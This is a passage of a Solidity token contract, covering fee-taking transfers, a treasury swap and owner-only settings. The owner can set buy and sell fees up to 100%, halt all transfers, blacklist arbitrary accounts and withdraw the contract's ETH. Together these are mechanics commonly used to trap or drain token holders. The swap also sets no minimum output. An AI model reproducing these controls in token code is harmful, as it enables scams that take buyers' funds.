1123                 _transferStandard(from, to, amount, treasuryFeeOnBuy);
1124             }
1125         }
1126 
1127         if (
1128             to != owner() &&
1129             to != uniswapV2Pair &&
1130             to != address(uniswapV2Router)
1131         ) {
1132             require(maxWallet >= balanceOf(to), "Max wallet limit exceed!");
1133         }
1134     }
1135 
1136     function swapAndSendTreasure(uint256 amount) private lockTheSwap {
1137         _swapTokensForEth(amount);
1138         if (address(this).balance > 0) {
1139             treasuryWallet.call{value: address(this).balance}("");
1140         }
1141     }
1142 
1143     function _swapTokensForEth(uint256 tokenAmount) private {
1144         // generate the uniswap pair path of token -> weth
1145         address[] memory path = new address[](2);
1146         path[0] = address(this);
1147         path[1] = uniswapV2Router.WETH();
1148 
1149         _approve(address(this), address(uniswapV2Router), tokenAmount);
1150 
1151         // make the swap
1152         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
1153             tokenAmount,
1154             0, // accept any amount of ETH
1155             path,
1156             address(this), // the contract
1157             block.timestamp
1158         );
1159 
1160         emit SwapTokensForETH(tokenAmount, path);
1161     }
1162 
1163     function _basicTransfer(
1164         address from,
1165         address to,
1166         uint256 amount
1167     ) private {
1168         _tOwned[from] = _tOwned[from].sub(amount);
1169         _tOwned[to] = _tOwned[to].add(amount);
1170         emit Transfer(from, to, amount);
1171     }
1172 
1173     function _transferStandard(
1174         address sender,
1175         address recipient,
1176         uint256 tAmount,
1177         uint256 fee
1178     ) private {
1179         uint256 treasuryFeeAmount = tAmount.div(100).mul(fee);
1180         uint256 transferAmount = tAmount.sub(treasuryFeeAmount);
1181         _tOwned[sender] = _tOwned[sender].sub(tAmount);
1182         _tOwned[recipient] = _tOwned[recipient].add(transferAmount);
1183         _tOwned[address(this)] = _tOwned[address(this)].add(treasuryFeeAmount);
1184         emit Transfer(sender, recipient, transferAmount);
1185         emit Transfer(sender, address(this), treasuryFeeAmount);
1186     }
1187 
1188     function isExcludedFromFee(address account) public view returns (bool) {
1189         return _isExcludedFee[account];
1190     }
1191 
1192     function excludeFromFee(address account) external onlyOwner {
1193         _isExcludedFee[account] = true;
1194     }
1195 
1196     function includeInFee(address account) external onlyOwner {
1197         _isExcludedFee[account] = false;
1198     }
1199 
1200     function setTreasuryFeePercent(uint256 _newFeeOnBuy, uint256 _newFeeOnSell)
1201         external
1202         onlyOwner
1203     {
1204         require(
1205             _newFeeOnBuy <= 100 && _newFeeOnSell <= 100,
1206             "fee cannot exceed 100%"
1207         );
1208         treasuryFeeOnBuy = _newFeeOnBuy;
1209         treasuryFeeOnSell = _newFeeOnSell;
1210     }
1211 
1212     function setTreasuryAddress(address _treasuryWallet) external onlyOwner {
1213         treasuryWallet = payable(_treasuryWallet);
1214     }
1215 
1216     function setSwapAndTreasureEnabled(bool flag) external onlyOwner {
1217         swapAndTreasureEnabled = flag;
1218     }
1219 
1220     function setCanTransfer(bool _canTransfer) external onlyOwner {
1221         _transferOpen = _canTransfer;
1222     }
1223 
1224     function setSwapAtAmount(uint256 amount) external onlyOwner {
1225         swapAtAmount = amount;
1226     }
1227 
1228     function setMaxWallet(uint256 amount) external onlyOwner {
1229         maxWallet = amount;
1230     }
1231 
1232     function isRemovedSniper(address account) external view returns (bool) {
1233         return _isSniper[account];
1234     }
1235 
1236     function removeSniper(address account) external onlyOwner {
1237         require(
1238             account != _uniswapRouterAddress,
1239             "We can not blacklist Uniswap"
1240         );
1241         require(!_isSniper[account], "Account is already blacklisted");
1242         _isSniper[account] = true;
1243         _confirmedSnipers.push(account);
1244     }
1245 
1246     function amnestySniper(address account) external onlyOwner {
1247         require(_isSniper[account], "Account is not blacklisted");
1248         for (uint256 i = 0; i < _confirmedSnipers.length; i++) {
1249             if (_confirmedSnipers[i] == account) {
1250                 _confirmedSnipers[i] = _confirmedSnipers[
1251                     _confirmedSnipers.length - 1
1252                 ];
1253                 _isSniper[account] = false;
1254                 _confirmedSnipers.pop();
1255                 break;
1256             }
1257         }
1258     }
1259 
1260     function emergencyWithdraw() external onlyOwner {
1261         payable(owner()).send(address(this).balance);
1262     }
1263 
1264     // to recieve ETH from uniswapV2Router when swaping
1265     receive() external payable {}
1266 }